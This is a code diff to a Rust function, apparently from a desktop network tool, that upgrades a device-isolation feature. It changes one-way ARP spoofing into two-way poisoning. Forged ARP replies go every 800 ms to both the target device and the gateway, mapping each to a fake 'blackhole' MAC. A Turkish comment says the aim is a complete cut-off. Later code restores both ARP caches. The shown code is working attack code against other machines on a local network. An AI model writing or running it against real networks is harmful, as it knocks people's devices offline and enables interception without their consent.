@@ -121,7 +121,7 @@ pub async fn isolate_device(
         Some(i) => i, None => return,
     };
 
-    let our_mac_addr = match parse_mac(&our_mac) { Some(m) => m, None => return };
+    let _our_mac_addr = match parse_mac(&our_mac) { Some(m) => m, None => return };
     let target_mac = get_arp_mac(&target_ip).await.unwrap_or(MacAddr::broadcast());
     // Get the real gateway MAC for restoration later
     let gateway_mac = get_arp_mac(&gateway_ip).await.unwrap_or(MacAddr::broadcast());
@@ -140,24 +140,30 @@ pub async fn isolate_device(
 
     tokio::spawn(async move {
         let mut count = 0u64;
+        let fake_mac = MacAddr::new(0xde, 0xad, 0xbe, 0xef, 0x00, 0x00); // Blackhole MAC
+
         while !stop.load(Ordering::Relaxed) {
-            // Only poison the TARGET's ARP cache — tell it "I am the gateway"
-            // We do NOT poison the gateway, so gateway's traffic is not disrupted
-            // We also do NOT forward packets → target loses internet
-            if let Some(p) = build_arp_reply(our_mac_addr, gateway_ip_addr, target_mac, target_ip_addr) {
+            // Tam koparma için hedefe gateway'in, gateway'e de hedefin MAC adresini "Blackhole" olarak yutturuyoruz.
+            if let Some(p) = build_arp_reply(fake_mac, gateway_ip_addr, target_mac, target_ip_addr) {
                 let _ = sender.send_to(&p, None);
             }
-            count += 1;
+            if let Some(p) = build_arp_reply(fake_mac, target_ip_addr, gateway_mac, gateway_ip_addr) {
+                let _ = sender.send_to(&p, None);
+            }
+
+            count += 2;
             let _ = app_clone.emit("mitm-status", MitmStatus {
                 active: true, target_ip: target.clone(), packets_intercepted: count, mode: "isolate".to_string()
             });
-            // Send more frequently for stronger isolation
             tokio::time::sleep(Duration::from_millis(800)).await;
         }
 
-        // RESTORE: send the real gateway MAC back to the target
+        // RESTORE: restore BOTH directions
         for _ in 0..8 {
             if let Some(p) = build_arp_reply(gateway_mac, gateway_ip_addr, target_mac, target_ip_addr) {
+                let _ = sender.send_to(&p, None);
+            }
+            if let Some(p) = build_arp_reply(target_mac, target_ip_addr, gateway_mac, gateway_ip_addr) {
                 let _ = sender.send_to(&p, None);
             }
             tokio::time::sleep(Duration::from_millis(100)).await;
